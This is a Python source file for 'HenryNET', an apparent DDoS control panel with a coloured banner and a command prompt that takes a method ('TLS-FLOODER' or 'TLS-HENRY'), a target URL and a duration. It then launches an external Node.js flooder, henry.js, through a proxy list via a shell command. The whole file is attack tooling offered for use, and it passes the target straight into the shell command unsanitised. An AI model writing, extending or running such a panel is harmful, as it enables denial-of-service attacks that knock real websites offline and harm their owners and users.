import os
import subprocess
import whois
from datetime import datetime
import pytz

def setup_console():
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('title [!] HenryNET - DEV / Username: [root] / Panel: [HenryNET]' if os.name == 'nt' else '')

def banner():
    setup_console()
    print("""
                    \033[1;37mHello Welcome To HenryNET \033[1;31m- \033[1;37mPOWER
                    \033[1;37mTry \033[1;31m[\033[1;37mHELP\033[1;31m] \033[1;37mView Commands
                    \033[1;30m=================================
                    \033[1;34m    _._     _,-'""`-._
                    \033[1;34m   (,-.`._,'(       |\`-/|
                    \033[1;34m       `-.-' \ )-`( , o o)
                    \033[1;34m             `-    \`_`"'-
                    \033[1;30m=================================

""")

def help_menu():
    print("""\033[1;33m- \033[1;37mTLS-FLOODER\033[1;31m: \033[1;37mH2 Reset rapid Raw flooder
\033[1;33m- \033[1;37mTLS-HENRY\033[1;31m: \033[1;37mNormal Power Stronger Flooder raw simple""")

def execute_attack(method, url, duration):
    if method == "TLS-FLOODER":
        command = f"node henry.js {url} {duration} 90 5 proxy.txt"
    elif method == "TLS-HENRY":
        command = f"node henry.js {url} {duration} 15 2 proxy.txt"
    else:
        print("\033[1;31mInvalid Method")
        return

    vn_tz = pytz.timezone('Asia/Ho_Chi_Minh')
    current_time_vn = datetime.now(vn_tz).strftime('%Y-%m-%d %H:%M:%S')

    try:
        subprocess.Popen(command, shell=True)
        print(f"""
\033[1;37mAttack Details\033[1;31m:
\033[1;37m  Status:    [ \033[1;32mSucessfully Sent To All Server \033[1;37m]
\033[1;37m  Host:      [ \033[1;34m{url} \033[1;37m]
\033[1;37m  Time:      [ \033[1;34m{duration} \033[1;37m]
\033[1;37m  Method:    [ \033[1;34m{method} \033[1;37m]
\033[1;37m  Send Time: [ \033[1;34m{current_time_vn} \033[1;37m]
""")
    except Exception as e:
        print(f"\033[1;31mServer API Error .")

def main():
    setup_console()
    banner()
    
    while True:
        user_input = input("\033[1;31m[\033[1;37mHenryNET\033[1;31m@\033[1;37mPanel\033[1;31m]\033[1;33m~$: \033[1;37m").strip().upper()

        if user_input == "HELP":
            setup_console()
            help_menu()
        
        if user_input == "CLS":
            setup_console()
            main()
        
        elif user_input.startswith("TLS-FLOODER") or user_input.startswith("TLS-HENRY"):
            try:
                parts = user_input.split()
                method = parts[0]
                url = parts[1]
                duration = parts[2]
                execute_attack(method, url, duration)
            except IndexError:
                print("\033[1;33mUsage\033[1;31m: \033[1;37mMethod Host Time.\n\033[1;33mExample\033[1;31m: \033[1;33m[\033[1;37mMethod\033[1;33m] \033[1;37mhttp://example.com 60")
        
        else:
            pass

if __name__ == "__main__":
    main()
